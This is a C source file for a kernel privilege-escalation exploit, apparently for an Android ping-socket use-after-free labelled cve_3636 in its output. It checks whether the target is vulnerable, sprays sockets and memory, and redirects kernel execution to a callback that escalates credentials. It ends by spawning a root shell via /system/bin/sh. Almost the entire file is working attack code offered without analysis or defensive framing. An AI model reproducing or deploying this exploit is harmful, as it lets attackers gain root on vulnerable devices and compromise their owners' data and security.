#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <linux/in.h>
#include <errno.h>
#include <sys/wait.h>


#define MAX_CHILD 1024
#define MAX_CHILD_SOCKS 65000
#define MAX_MMAP 1024
#define MAP_SIZE (4 * 1024 * 1024)

#define SIOCGSTAMPNS 0x8907

#define FILL_DATA 0x50000000
#define NSEC_PER_SEC 1000000000

#define _PAGE_SIZE 0x1000

extern int root_by_set_cred(void);
extern int root_by_commit_cred();

int (*my_printk)(const char *fmt, ...) = 0;
struct task_struct *(*my_find_task_by_pid_ns)(pid_t nr, struct pid_namespace *ns);
struct files_struct *(*my_get_files_struct)(struct task_struct *task);

extern unsigned long lookup_sym(const char *name);
pid_t my_pid;
struct file;
struct fdtable {
	unsigned int max_fds;
	struct file **fd;      /* current fd array */
	unsigned long *close_on_exec;
	unsigned long *open_fds;
	unsigned long *place_holder[2];
	struct fdtable *next;
};

struct files_struct {
  /*
   * read mostly part
   */
	int count;
	struct fdtable *fdt;
	struct fdtable fdtab;

};
struct pid_namespace;

static int call_back()
{
        int tmp;
        struct files_struct *fs;
        struct pid_namespace *ns;
        int i;
        struct ping_table *pt;
	int first = 0;

	my_pid = getpid();
        my_printk = lookup_sym("printk");
        my_find_task_by_pid_ns = lookup_sym("find_task_by_pid_ns");
        my_get_files_struct = lookup_sym("get_files_struct");
        ns = lookup_sym("init_pid_ns");
        my_printk("GOT in kernel!\n");

        pt = lookup_sym("ping_table");

        root_by_set_cred();

        fs = my_get_files_struct(my_find_task_by_pid_ns(my_pid, ns));
        struct fdtable *fdt  =  fs->fdt;

        while (fdt) {
		if (!first) {
			fdt->max_fds = 3;
			first = 1;
		}
		else
			fdt->max_fds = 0;
		
                fdt = fdt->next;
        }


        /* for(i = 0; i < 64; i++) { */
        /*         pt->hash[i].first = (i << 1) + 1; */
        /* } */
        
        /*
        for(i = PING_PAD; i < PING_MAX; i++) {
                if (fds_close[i - PING_PAD] == 0) {
                        //printf("close sockfd %d\n", i);
                        close(fds[i]);
                }
        }
        */

        /* struct thread_info_part *thread_info = (unsigned long)&tmp & ~0x1fff; */
        /* thread_info->addr_limit = 0; */

        return 0;
}


static int maximize_fd_limit(void)
{
	struct rlimit rlim;
	int ret;

	ret = getrlimit(RLIMIT_NOFILE, &rlim);
	if (ret != 0) {
		return -1;
	}

	rlim.rlim_cur = rlim.rlim_max;
	setrlimit(RLIMIT_NOFILE, &rlim);

	ret = getrlimit(RLIMIT_NOFILE, &rlim);
	if (ret != 0) {
		return -1;
	}

	return rlim.rlim_cur;
}

static int create_icmp_socket(void)
{
	struct sockaddr_in sa;
	int sock;
	int ret;

	memset(&sa, 0, sizeof sa);
	sa.sin_family = AF_INET;

	sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP);
	if (sock == -1) {
		return -1;
	}

	ret = connect(sock, (struct sockaddr *)&sa, sizeof sa);
	if (ret != 0) {
		int result;

		result = errno;
		close(sock);
		errno = result;

		return -1;
	}

	return sock;
}


static int wait_for_child(int pipe_read, int *child_socks)
{
	int i;
	int ret;


	/* ret = fcntl(pipe_read, F_SETFL, O_NONBLOCK); */
	/* if (ret == -1) { */
	/* 	perror("fcntl()"); */
	/* 	return -1; */
	/* } */

	for (i = 0; i < 50; i++) {
		ret = read(pipe_read, child_socks, sizeof(int));
		//printf("parent read: %d \n", ret);
		if (ret == -1 && errno == EAGAIN) {
			usleep(100000);
			continue;
		}

		break;
	}

	if (ret == -1 && errno == EAGAIN) {
		printf("read(): Timeout\n");
		return -1;
	}

	if (ret == -1) {
		perror("read()");
		return -1;
	}

	if (ret != sizeof(int)) {
		printf("read(): Unexpected EOF\n");
		perror("wait child");
		return -1;
	}


	return 0;
}

static void close_fds_except_pipe(int pipe_fd, int max_fd)
{
	int i;
	for(i = 0; i < max_fd; i++) {
		if (i == pipe_fd)
			continue;
		close(i);
	}
}


static int create_child(int *pipe_read, int max_fd, int *child_socks)
{
	pid_t pid;
	int socks[max_fd];
	int i;
	int fds[2];

	int ret;

	if (pipe(fds) < 0){
		perror("pipe");
		return -1;
	}

	pid = fork();
	if (pid < 0)
		return -1;
	if (pid == 0) {
		//close(fds[0]);
		close_fds_except_pipe(fds[1], max_fd);

		for (i = 0; i < max_fd; i++) {
			socks[i] = create_icmp_socket();
			if (socks[i] < 0) {
				//printf("\ncan not create socket!\n");
				break;
			}
		}

		printf("child create %d sockets!\n", i);
		write(fds[1], &i, sizeof(int));

		while (1) {
			sleep(6);
		}
		exit(0);

	}

	/* parent process */
	close(fds[1]);
	*pipe_read = fds[0];
	ret = wait_for_child(fds[0], child_socks);
	if (ret != 0)
		return -1;
	return pid;
}

static int setup_vul_socket(int sock)
{
	struct sockaddr_in sa;
	int ret;

	memset(&sa, 0, sizeof sa);
	sa.sin_family = AF_UNSPEC;

	ret = connect(sock, (struct sockaddr *)&sa, sizeof sa);
	if (ret != 0) {
		printf("connect(%d) #1: ret = %d\n", sock, ret);
		return -1;
	}

	ret = connect(sock, (struct sockaddr *)&sa, sizeof sa);
	if (ret != 0) {
		printf("connect%d() #2: ret = %d\n", sock, ret);
		return -1;
	}

	return 0;
}

static int close_child(pid_t pid)
{
	int timeout;
	int status;
	int success;
	int ret;

	success = 0;

	kill(pid,  SIGTERM);

	for (timeout = 50; timeout > 0; timeout--) {
		ret = waitpid(pid, &status, WNOHANG);
		if (ret != 0) {
			break;
		}

		if (WIFEXITED(status)) {
			success = 1;
			break;
		}

		usleep(100000);
	}

	kill(pid,  SIGKILL);

	ret = waitpid(pid, &status, 0);
	if (ret != 0) {
		return -1;
	}

	if (WIFEXITED(status)) {
		success = 1;
	}

	if (success) {
		return 0;
	}

	return -1;
}

static int fill_payload(unsigned long *addr, unsigned long size)
{
	int i;

	for (i = 0; i < (size / sizeof(unsigned long*)); i++) {
		addr[i] = FILL_DATA;
	}

	return 0;
}

static int get_sk(int sock)
{
	struct timespec tv;
	uint64_t value;
	uint32_t high, low;
	int ret;

	ret = ioctl(sock, SIOCGSTAMPNS, &tv);
	if (ret != 0) {
		return -1;
	}

	if (tv.tv_sec == 0x5798ee24
	    || tv.tv_sec == 0x50000000) {
		//printf("sock object refill done!\n");
		//ioctl(fds[i], 0x5678, &temp);
		return 1;

	}

	/* value = ((uint64_t)tv.tv_sec * NSEC_PER_SEC) + tv.tv_nsec; */
	/* high = (unsigned)(value >> 32); */
	/* low = (unsigned)value; */

	/* if (high == FILL_DATA){ */
	/* 	return 1; */
	/* } */

	return 0;

}


int main()
{
	int *socks;
	unsigned long *address[MAX_MMAP];
	int pid[MAX_CHILD];
	int pipe_read[MAX_CHILD];

	void *addr;
	int max_fds;
	int i, num_socks, num_child;
	int j;
	int success, count;
	int fd;
	int vulnerable = 0;
	int child_socks, total_child_socks;
	int temp;
	unsigned long *target;


	addr = mmap((void*)0x200000, _PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	if (addr == MAP_FAILED) {
		printf("map failed!\n");
		return -1;
	}
	memset((void*)0x200000, 0, _PAGE_SIZE);

	fd = create_icmp_socket();
	if (fd < 0) {
		printf("can not crate icmp socket!\n");
		return -1;
	}

	setup_vul_socket(fd);

	for (i = 0; i < _PAGE_SIZE / sizeof(int *); i++) {
		if (((unsigned int*)addr)[i] != 0) {
			vulnerable = 1;
			break;
		}
	}

	if (vulnerable == 0) {
		printf("cve_3636 not vulnerable!\n");
		return -1;
	}

	if (mmap(0x50000000, 0x4000, PROT_WRITE | PROT_READ | PROT_EXEC,
                 MAP_SHARED | MAP_ANONYMOUS | MAP_FIXED, -1, 0) != 0x50000000) {
                printf("map shellcode area failed!\n");
                return -1;
        }

        for (i = 0; i < 0x4000; i += 4){
                target = 0x50000000 + i;
                *target = call_back;
        }


	max_fds = maximize_fd_limit();
	printf("max_fds = %d\n", max_fds);
	socks = malloc(sizeof(int*) * (max_fds + 1));

	printf("create child to spray\n");
	num_child = 0;
	num_socks = 0;
	child_socks = 0;
	total_child_socks = 0;
	for (i = 0; i < MAX_CHILD; i++) {

		
		pid[i] = create_child(&pipe_read[i], max_fds, &child_socks);

		if (pid[i] == -1)
			break;

		printf(".");
		fflush(stdout);
		//printf("create vulnerable socket!\n");
		total_child_socks += child_socks;
		//printf("\n now child sockets = %d\n", total_child_socks);
		if ( num_socks < max_fds) {
			socks[num_socks] = create_icmp_socket();
			if (socks[num_socks] == -1)
				break;
			num_socks++;
		}
	}
	num_child = i;
	printf("\nchild num: %d\n", num_child);

	socks[num_socks] = -1;

	printf("vulnerable socket num: %d\n", num_socks);

	printf("now close child socket!\n");
	for (i = 0; i < num_child; i++) {
		close_child(pid[i]);
	}

	printf("setup vulnerable socket!\n");

	for (i = 0; i < num_socks; i++) {

		setup_vul_socket(socks[i]);
	}

	printf("sparying ...\n");
	success = 0;
	while (1) {

		count = 0;
		for (i = 0; i < MAX_MMAP; i++) {
			address[i] = mmap((void*)0, MAP_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC,
					MAP_SHARED|MAP_ANONYMOUS, -1, 0);
			if (address[i] == MAP_FAILED)
			{
				printf("map failed!\n");
				break;
			}
			fill_payload(address[i], MAP_SIZE);
			for (j = 0; socks[j] != -1; j++) {
				if (get_sk(socks[j]) > 0) {
					success = 1;
					printf("get it!\n");
					ioctl(socks[j], 0x5678, &temp);
					break;
				}
			}
			if (success)
				break;
		}
		count = i;

		if (success) {
			printf("free %ld bytes\n", MAP_SIZE * (count - 1));
			for (i = 0; i < count; i++) {
				munmap(address[i], MAP_SIZE);
			}
			munmap(0x50000000, 0x4000);
			system("/system/bin/sh");

			break;
		}
	}
	
	printf("main end!\n");

	return 0;
}
